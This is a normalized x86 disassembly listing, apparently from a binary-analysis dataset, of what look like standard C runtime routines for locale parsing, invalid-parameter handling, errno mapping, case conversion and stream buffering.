cmp eax 0x40
jae r-xdata
cmp bl 0x2e
je r-xdata
cmp eax 0x10
jae r-xdata
cmp bl 0x5f
je r-xdata
push eax
push esi
push 0x40
push [ ebp + 0x8 ]
jmp r-xdata
test bl bl
je r-xdata
push eax
mov eax [ ebp + 0x8 ]
push esi
push 0x40
add eax 0x40
jmp r-xdata
call sub_201a591
add esp 0x10
test eax eax
je r-xdata
push eax
mov eax [ ebp + 0x8 ]
push esi
push 0x10
sub eax 0xffffff80
cmp bl 0x2c
jne r-xdata
push eax
cmp bl 0x2c
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_200f929
add esp 0x14
test bl bl
je r-xdata
inc [ ebp + 0xc ]
lea esi [ edi + 0x1 ]
push r--data
push esi
call sub_201cdd0
test eax eax
sub_200ec24
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x10 ]
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_200a6e1
add esp 0xc
xor ebx ebx
test eax eax
je r-xdata
lea eax [ esi + 0x40 ]
cmp [ eax ] bl
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_200f929
add esp 0x14
lea eax [ esi + 0x80 ]
cmp [ eax ] bl
pop esi
pop ebx
je r-xdata
push eax
push r--data
push 0x2
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_200eabb
add esp 0x14
pop ebp
retn
push eax
push r--data
push 0x2
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_200eabb
add esp 0x14
sub_200ec91
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
xor ebx ebx
inc ebx
push 0x355
mov [ ebp - 0x10 ] ebx
call sub_201a99e
pop ecx
mov [ ebp - 0x14 ] eax
test eax eax
je r-xdata
pop ebx
leave
retn
push edi
lea edi [ eax + 0x4 ]
mov [ edi ] 0x0
mov [ eax ] ebx
mov [ ebp - 0x8 ] ebx
lea ebx [ esi + 0x10 ]
lea eax [ ebx + 0x48 ]
push [ eax ]
mov [ ebp - 0xc ] eax
push r--data
push [ r--data ]
push 0x3
push 0x351
push edi
call sub_200eabb
mov eax [ ebp - 0xc ]
add esp 0x18
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] r--data
push [ ebx + 0x58 ]
mov eax [ ebp - 0xc ]
push [ eax ]
call sub_201a3a0
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_200f929
add esp 0x14
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
add [ ebp - 0x4 ] 0xc
shl eax 0x4
lea ebx [ eax + esi ]
lea eax [ ebx + 0x48 ]
push [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
push r--data
push [ eax ]
push 0x3
push 0x351
push edi
call sub_200eabb
add esp 0x18
cmp [ ebp - 0x4 ] r--data
jl r-xdata
and [ ebp - 0x10 ] 0x0
push r--data
push 0x351
push edi
call sub_200acc7
add esp 0xc
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
push [ ebp - 0x14 ]
call sub_2009d98
mov eax [ esi + 0x50 ]
mov edi [ InterlockedDecrement@IAT ]
xor ebx ebx
pop ecx
cmp eax ebx
je r-xdata
mov eax [ esi + 0x50 ]
mov ebx [ InterlockedDecrement@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x54 ]
cmp eax ebx
je r-xdata
push eax
call edi
test eax eax
jne r-xdata
mov eax [ esi + 0x54 ]
test eax eax
je r-xdata
push eax
call ebx
test eax eax
jne r-xdata
mov eax [ esi + 0x68 ]
mov [ esi + 0x54 ] ebx
mov [ esi + 0x4c ] ebx
mov [ esi + 0x50 ] ebx
mov [ esi + 0x48 ] ebx
push eax
call edi
test eax eax
jne r-xdata
push [ esi + 0x50 ]
call sub_2009d98
pop ecx
mov eax [ ebp - 0x14 ]
and [ esi + 0x54 ] 0x0
and [ esi + 0x4c ] 0x0
mov [ esi + 0x50 ] eax
mov [ esi + 0x48 ] edi
mov eax edi
jmp r-xdata
push eax
call ebx
test eax eax
jne r-xdata
push [ esi + 0x50 ]
call sub_2009d98
pop ecx
push [ esi + 0x54 ]
call sub_2009d98
pop ecx
pop edi
push [ esi + 0x54 ]
call sub_2009d98
pop ecx
sub_200ee0e
mov edi edi
push ebp
mov ebp esp
sub esp 0xb4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
mov [ ebp - 0x9c ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0xa4 ] edi
mov [ ebp - 0xa0 ] eax
call sub_200d753
add eax 0x9c
lea ecx [ eax + 0x28 ]
mov [ ebp - 0xac ] ecx
lea ecx [ eax + 0x2c ]
lea ebx [ eax + 0x20 ]
add eax 0xaf
mov [ ebp - 0xa8 ] ecx
mov [ ebp - 0x98 ] eax
test esi esi
je r-xdata
xor eax eax
cmp [ ebp - 0x9c ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ esi ] 0x43
jne r-xdata
push esi
call sub_2016140
mov edi 0x83
pop ecx
mov [ ebp - 0xb0 ] eax
cmp eax edi
jae r-xdata
cmp [ esi + 0x1 ] 0x0
jne r-xdata
and [ ebp - 0xb4 ] 0x0
lea eax [ ebp - 0x94 ]
push esi
push eax
call sub_200eafb
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
push [ ebp - 0x98 ]
call sub_201a3a0
pop ecx
pop ecx
test eax eax
je r-xdata
push r--data
push [ ebp + 0x10 ]
push [ ebp - 0x9c ]
call sub_200a6e1
add esp 0xc
xor esi esi
test eax eax
je r-xdata
lea eax [ ebp - 0x94 ]
push eax
push ebx
push eax
call sub_201d411
add esp 0xc
test eax eax
je r-xdata
xor esi esi
push esi
push [ ebp - 0xa8 ]
call sub_201a3a0
pop ecx
pop ecx
test eax eax
je r-xdata
cmp edi esi
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_200f929
add esp 0x14
movzx eax [ ebx + 0x4 ]
mov ecx [ ebp - 0xac ]
mov [ ecx ] eax
lea eax [ ebp - 0x94 ]
push eax
push edi
push [ ebp - 0x98 ]
call sub_200ec24
add esp 0xc
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp - 0xa0 ] esi
je r-xdata
push 0x6
push ebx
push [ ebp - 0xa4 ]
call sub_2013e10
add esp 0xc
mov eax [ ebp - 0xa0 ]
cmp eax esi
je r-xdata
xor eax eax
mov [ edi ] ax
mov [ edi + 0x2 ] ax
mov [ edi + 0x4 ] ax
mov eax [ ebp - 0xb4 ]
mov esi r--data
mov eax [ ebp - 0xb0 ]
cmp eax edi
jb r-xdata
push [ ebp - 0x98 ]
push [ ebp + 0x10 ]
push [ ebp - 0x9c ]
call sub_200a6e1
add esp 0xc
test eax eax
je r-xdata
push 0x4
push [ ebp - 0xac ]
push [ ebp - 0xa0 ]
call sub_2013e10
add esp 0xc
mov eax [ ebp - 0x9c ]
jmp r-xdata
mov [ eax ] esi
xor esi esi
push esi
push esi
push esi
push esi
push esi
call sub_200f929
add esp 0x14
jmp r-xdata
inc eax
push eax
push esi
push edi
push [ ebp - 0xa8 ]
call sub_201a591
add esp 0x10
test eax eax
je r-xdata
mov eax [ ebp - 0x98 ]
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_200f929
add esp 0x14
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_200b53e
leave
retn
cmp [ ebp - 0xa4 ] esi
je r-xdata
sub_200f03f
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
mov ebx ecx
call sub_200d753
push [ ebp + 0x8 ]
mov edi eax
lea eax [ ebp - 0x198 ]
push eax
lea eax [ ebp - 0x1b0 ]
push eax
push 0x83
lea eax [ ebp - 0x88 ]
push eax
push ebx
add edi 0x1d0
call sub_200ee0e
add esp 0x18
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
shl eax 0x4
lea ebx [ eax + esi ]
push [ ebx + 0x48 ]
lea eax [ ebp - 0x88 ]
push eax
call sub_201a3a0
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x48 ]
lea eax [ ebp - 0x88 ]
push eax
call sub_2016140
add eax 0x5
push eax
mov [ ebp - 0x18c ] eax
call sub_201a99e
pop ecx
pop ecx
mov [ ebp - 0x190 ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_200b53e
leave
retn
mov eax [ ebx + 0x48 ]
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x1a4 ] eax
lea eax [ esi + ecx * 4 + 0xc ]
add ecx 0x6
imul ecx ecx 0x6
mov [ ebp - 0x194 ] eax
mov eax [ eax ]
mov [ ebp - 0x1a8 ] eax
lea eax [ ecx + esi ]
push 0x6
push eax
mov [ ebp - 0x19c ] eax
lea eax [ ebp - 0x1c4 ]
push eax
call sub_2013e10
mov eax [ esi + 0x4 ]
lea ecx [ ebp - 0x88 ]
push ecx
mov ecx [ ebp - 0x18c ]
mov [ ebp - 0x1b4 ] eax
mov eax [ ebp - 0x190 ]
add ecx 0xfffffffc
add eax 0x4
push ecx
push eax
call sub_200a6e1
add esp 0x18
test eax eax
je r-xdata
mov eax [ ebp - 0x190 ]
mov ecx [ ebp - 0x194 ]
add eax 0x4
mov [ ebx + 0x48 ] eax
movzx eax [ ebp - 0x1b0 ]
mov [ ecx ] eax
push 0x6
lea eax [ ebp - 0x1b0 ]
push eax
push [ ebp - 0x19c ]
call sub_2013e10
add esp 0xc
cmp [ ebp + 0x8 ] 0x2
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_200f929
add esp 0x14
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
mov eax [ ebp - 0x198 ]
and [ ebp - 0x18c ] 0x0
mov [ esi + 0x4 ] eax
mov eax [ edi + 0x24 ]
mov ecx [ edi + 0x20 ]
mov [ ebp - 0x19c ] eax
mov eax edi
mov eax [ ebp + 0x8 ]
imul eax eax 0xc
push esi
call [ eax + r--data ]
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x198 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp - 0x18c ]
test eax eax
je r-xdata
mov edx [ eax ]
inc [ ebp - 0x18c ]
mov [ eax ] ecx
mov ecx [ ebp - 0x19c ]
mov [ ebp - 0x1bc ] edx
mov edx [ eax + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp - 0x1bc ]
add eax 0x8
cmp [ ebp - 0x18c ] 0x5
mov [ ebp - 0x19c ] edx
jl r-xdata
cmp [ ebp - 0x1a4 ] rw-data
je r-xdata
mov eax [ ebp - 0x1a4 ]
push [ ebp - 0x190 ]
mov [ ebx + 0x48 ] eax
call sub_2009d98
mov eax [ ebp - 0x1a8 ]
pop ecx
mov ecx [ ebp - 0x194 ]
mov [ ecx ] eax
mov eax [ ebp - 0x1b4 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x18c ] 0x5
jne r-xdata
lea eax [ edi + eax * 8 ]
mov edx [ eax ]
mov [ edi ] edx
mov edx [ eax + 0x4 ]
mov [ edi + 0x4 ] edx
mov [ eax ] ecx
mov ecx [ ebp - 0x19c ]
mov [ eax + 0x4 ] ecx
mov edx [ esi + 0x4 ]
cmp edx [ eax ]
je r-xdata
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ebp - 0x190 ]
add ecx 0x5
shl ecx 0x4
mov [ eax ] 0x1
mov [ ecx + esi ] eax
mov eax [ ebp + 0x8 ]
add eax 0x5
shl eax 0x4
lea edi [ eax + esi ]
push [ edi ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax [ edi + 0x4 ]
mov [ esi + 0xa8 ] eax
push 0x1
push [ esi + 0x14 ]
lea eax [ ebp - 0x188 ]
push [ esi + 0x4 ]
push eax
push 0x7f
push r--data
push 0x1
push 0x0
call sub_201ac89
add esp 0x20
test eax eax
je r-xdata
push [ edi ]
call sub_2009d98
push [ ebx + 0x54 ]
call sub_2009d98
and [ ebx + 0x4c ] 0x0
pop ecx
pop ecx
and [ edi + 0x4 ] 0x0
xor eax eax
mov ecx 0x1ff
and [ ebp + eax * 2 - 0x188 ] cx
inc eax
cmp eax 0x7f
jb r-xdata
push 0xfe
push [ rw-data ]
lea eax [ ebp - 0x188 ]
push eax
call sub_201eb78
add esp 0xc
neg eax
sbb eax eax
inc eax
mov [ edi + 0x4 ] eax
jmp r-xdata
mov eax [ esi + 0x4 ]
mov [ edi ] eax
sub_200f341
mov edi edi
push ebp
mov ebp esp
sub esp 0x98
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
xor ebx ebx
mov esi edx
push edi
mov [ ebp - 0x98 ] esi
cmp eax ebx
je r-xdata
mov [ ebp - 0x90 ] 0x1
mov [ ebp - 0x8c ] ebx
cmp ecx ebx
je r-xdata
cmp ecx ebx
je r-xdata
call sub_200ec91
cmp [ ecx ] 0x4c
jne r-xdata
shl eax 0x4
mov eax [ eax + esi + 0x48 ]
jmp r-xdata
push eax
call sub_200f03f
pop ecx
jmp r-xdata
push ebx
push ebx
push ebx
push 0x83
lea eax [ ebp - 0x88 ]
push eax
push ecx
call sub_200ee0e
add esp 0x18
cmp eax ebx
je r-xdata
cmp [ ecx + 0x1 ] 0x43
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_200b53e
leave
retn
lea edi [ esi + 0x48 ]
cmp [ ecx + 0x2 ] 0x5f
jne r-xdata
inc ebx
add edi 0x10
cmp ebx 0x5
jle r-xdata
push [ edi ]
lea eax [ ebp - 0x88 ]
push eax
call sub_201a3a0
pop ecx
pop ecx
test eax eax
je r-xdata
mov edi ecx
test ebx ebx
je r-xdata
xor eax eax
cmp [ ebp - 0x90 ] eax
jne r-xdata
inc [ ebp - 0x8c ]
push ebx
lea ecx [ ebp - 0x88 ]
call sub_200f03f
pop ecx
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
sub eax edi
mov [ ebp - 0x90 ] eax
je r-xdata
cmp [ ebp - 0x8c ] eax
je r-xdata
and [ ebp - 0x90 ] eax
jmp r-xdata
cmp [ ebx ] 0x3b
je r-xdata
mov [ ebp - 0x94 ] 0x1
mov esi r--data
jmp r-xdata
push eax
push edi
push [ esi ]
call sub_20201f8
add esp 0xc
test eax eax
jne r-xdata
inc [ ebp - 0x94 ]
add esi 0xc
cmp esi r--data
jle r-xdata
push [ esi ]
call sub_2016140
pop ecx
cmp [ ebp - 0x90 ] eax
je r-xdata
mov eax [ ebp - 0x90 ]
inc ebx
push r--data
push ebx
call sub_201cdd0
mov edi eax
xor esi esi
pop ecx
pop ecx
cmp edi esi
jne r-xdata
cmp [ ebp - 0x94 ] 0x5
jg r-xdata
cmp [ ebx ] 0x3b
jne r-xdata
add edi ebx
cmp [ edi ] 0x0
je r-xdata
push edi
push ebx
lea eax [ ebp - 0x88 ]
push 0x83
push eax
call sub_201a591
add esp 0x10
test eax eax
je r-xdata
xor eax eax
cmp [ ebp - 0x8c ] eax
je r-xdata
inc edi
cmp [ edi ] 0x0
jne r-xdata
push [ ebp - 0x94 ]
mov esi [ ebp - 0x98 ]
lea ecx [ ebp - 0x88 ]
mov [ ebp + edi - 0x88 ] 0x0
call sub_200f03f
pop ecx
test eax eax
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_200f929
add esp 0x14
mov esi [ ebp - 0x98 ]
jmp r-xdata
push r--data
push edi
call sub_20202c0
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
inc [ ebp - 0x8c ]
sub_200f55c
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x5
push esi
push edi
ja r-xdata
xor eax eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
xor edi edi
inc edi
push edi
push 0x8
call sub_201a9e3
mov esi eax
pop ecx
pop ecx
test esi esi
jne r-xdata
push edi
push 0xd8
call sub_201a9e3
pop ecx
pop ecx
mov [ esi ] eax
test eax eax
jne r-xdata
call sub_200fb13
mov [ eax ] 0xc
push edi
push 0x220
call sub_201a9e3
pop ecx
pop ecx
mov [ esi + 0x4 ] eax
test eax eax
jne r-xdata
push esi
call sub_2009d98
mov eax [ esi ]
mov ecx rw-data
call sub_200e7a0
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ esi ]
call sub_200f341
pop ecx
test eax eax
jne r-xdata
push [ esi ]
call sub_2009d98
push esi
call sub_2009d98
pop ecx
jmp r-xdata
push [ esi + 0x4 ]
mov eax [ esi ]
push [ eax + 0x4 ]
call sub_200e148
pop ecx
pop ecx
test eax eax
je r-xdata
push [ esi ]
call sub_200e707
push [ esi ]
call sub_200e52f
push esi
call sub_2009d98
add esp 0xc
jmp r-xdata
pop ecx
jmp r-xdata
mov eax [ esi + 0x4 ]
mov [ eax ] edi
mov eax [ esi + 0x4 ]
mov [ eax ] edi
push [ esi + 0x4 ]
call sub_2009d98
push [ esi ]
call sub_200e707
push [ esi ]
call sub_200e52f
push esi
call sub_2009d98
add esp 0x10
xor esi esi
jmp r-xdata
pop edi
pop esi
pop ebp
retn
mov eax esi
jmp r-xdata
sub_200f65c
push 0x14
push r--data
call sub_200db54
xor ebx ebx
mov [ ebp - 0x20 ] ebx
cmp [ ebp + 0x8 ] 0x5
jbe r-xdata
call sub_200d753
mov esi eax
mov [ ebp - 0x1c ] esi
call sub_200e804
or [ esi + 0x70 ] 0x10
mov [ ebp - 0x4 ] ebx
push 0x1
push 0xd8
call sub_201a9e3
pop ecx
pop ecx
mov edi eax
mov [ ebp - 0x24 ] edi
cmp edi ebx
je r-xdata
call sub_200fb13
mov [ eax ] 0x16
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_200fa90
add esp 0x14
xor eax eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_200f7c7
mov eax [ ebp - 0x20 ]
push 0xc
call sub_2010e3c
pop ecx
mov [ ebp - 0x4 ] 0x1
mov ecx [ esi + 0x6c ]
mov eax edi
call sub_200e7a0
mov [ ebp - 0x4 ] ebx
call sub_200f78a
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx edi
call sub_200f341
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax ebx
je r-xdata
call sub_200db99
retn
push edi
call sub_200e707
push edi
call sub_200e52f
pop ecx
pop ecx
cmp [ ebp + 0xc ] ebx
je r-xdata
push 0xc
call sub_2010e3c
pop ecx
mov [ ebp - 0x4 ] 0x2
lea ebx [ esi + 0x6c ]
mov eax ebx
call sub_200e7c6
push edi
call sub_200e707
pop ecx
test [ esi + 0x70 ] 0x2
jne r-xdata
push rw-data
push [ ebp + 0xc ]
call sub_201a3a0
pop ecx
pop ecx
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_200f796
jmp r-xdata
test [ rw-data ] 0x1
jne r-xdata
mov [ rw-data ] 0x1
mov edi [ ebx ]
mov eax rw-data
call sub_200e7c6
push 0x18
mov eax [ rw-data ]
add eax 0xc
push eax
push rw-data
call sub_2013e10
add esp 0xc
call sub_200e8e4
sub_200f7d9
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_20099ee
mov ebx [ ebp + 0x8 ]
mov esi 0x100
cmp ebx esi
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0xac ] 0x1
jle r-xdata
call sub_200fb13
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_2014595
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ecx + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x1
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
call sub_2014880
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x8 ]
je r-xdata
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
mov eax [ ecx + 0xcc ]
movzx eax [ eax + ebx ]
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx ecx [ ebp - 0x7 ]
shl eax 0x8
or eax ecx
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push esi
push [ eax + 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_2014550
add esp 0x24
test eax eax
je r-xdata
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_200f8ee
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_200f7d9
pop ecx
pop ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp ecx 0x19
ja r-xdata
pop ebp
retn
add eax 0x20
pop ebp
retn
sub_200f929
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x328 ] 0x0
push ebx
push 0x4c
lea eax [ ebp - 0x324 ]
push 0x0
push eax
call sub_2013580
lea eax [ ebp - 0x328 ]
mov [ ebp - 0x2d8 ] eax
lea eax [ ebp - 0x2d0 ]
add esp 0xc
mov [ ebp - 0x2d4 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
lea ecx [ ebp + 0x4 ]
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x20c ] ecx
mov ecx [ ecx - 0x4 ]
mov [ ebp - 0x21c ] ecx
mov [ ebp - 0x328 ] 0xc0000417
mov [ ebp - 0x324 ] 0x1
mov [ ebp - 0x31c ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov ebx eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x2d8 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push 0xc0000417
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_200b53e
leave
retn
test ebx ebx
jne r-xdata
push 0x2
call sub_2020300
pop ecx
sub_200fa51
mov edi edi
push ebp
mov ebp esp
push esi
push [ rw-data ]
call sub_200d4ca
push [ ebp + 0x8 ]
mov esi eax
call sub_200d44f
pop ecx
pop ecx
mov [ rw-data ] eax
mov eax esi
pop esi
pop ebp
retn
sub_200fa90
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call sub_200d4ca
pop ecx
test eax eax
je r-xdata
push 0x2
call sub_2020300
pop ecx
pop ebp
jmp sub_200f929
pop ebp
jmp eax
sub_200fad1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ecx * 8 + rw-data ]
pop ebp
retn
inc ecx
cmp ecx 0x2d
jb r-xdata
cmp eax [ ecx * 8 + rw-data ]
je r-xdata
lea ecx [ eax - 0x13 ]
cmp ecx 0x11
ja r-xdata
add eax 0xffffff44
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_200fb39
mov edi edi
push ebp
mov ebp esp
push esi
call sub_200fb26
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_200fad1
pop ecx
mov esi eax
call sub_200fb13
mov [ eax ] esi
pop esi
pop ebp
retn
sub_200fb5c
mov edi edi
push ebp
mov ebp esp
call sub_200d6da
test eax eax
jne r-xdata
call sub_200fb13
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
xor eax eax
pop ebp
retn
push 0xc
pop eax
pop ebp
retn
sub_200fb7d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
cmp esi eax
jne r-xdata
call sub_200fb13
mov eax [ eax ]
mov [ esi ] eax
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_200fa90
add esp 0x14
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_200fbac
mov edi edi
push ebp
mov ebp esp
call sub_200d6da
test eax eax
jne r-xdata
call sub_200fb26
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
xor eax eax
pop ebp
retn
push 0xc
pop eax
pop ebp
retn
sub_200fbcd
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
cmp esi eax
jne r-xdata
call sub_200fb26
mov eax [ eax ]
mov [ esi ] eax
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_200fa90
add esp 0x14
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_200fbfc
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_20134c9
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_200fb13
mov [ eax ] 0x9
push ebx
xor ebx ebx
test al 0x1
je r-xdata
call sub_200fb13
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x2
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x4 ] ebx
test eax 0x10c
jne r-xdata
mov [ esi + 0x4 ] ebx
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_20125d6
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
or eax 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
xor edi edi
inc edi
push edi
lea eax [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
call sub_2013d2d
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
dec ecx
cmp edi ebx
mov [ esi + 0x4 ] ecx
jle r-xdata
push [ ebp + 0xc ]
call sub_20204ef
pop ecx
test eax eax
jne r-xdata
call sub_20125d6
add eax 0x40
cmp esi eax
jne r-xdata
pop ebx
mov eax [ ebp + 0x8 ]
and eax 0xff
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_2013d2d
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_20204a6
pop ecx
pop edi
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push ebx
push ebx
push ecx
call sub_202038d
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_200fd60
mov edi edi
push ebp
mov ebp esp
test [ edi + 0xc ] 0x40
push ebx
push esi
mov esi eax
mov ebx ecx
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jg r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov al [ ebx ]
dec [ ebp + 0x8 ]
mov ecx edi
call sub_20207f5
inc ebx
cmp [ esi ] 0xffffffff
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
add [ esi ] eax
jmp r-xdata
call sub_200fb13
cmp [ eax ] 0x2a
jne r-xdata
mov ecx edi
mov al 0x3f
call sub_20207f5
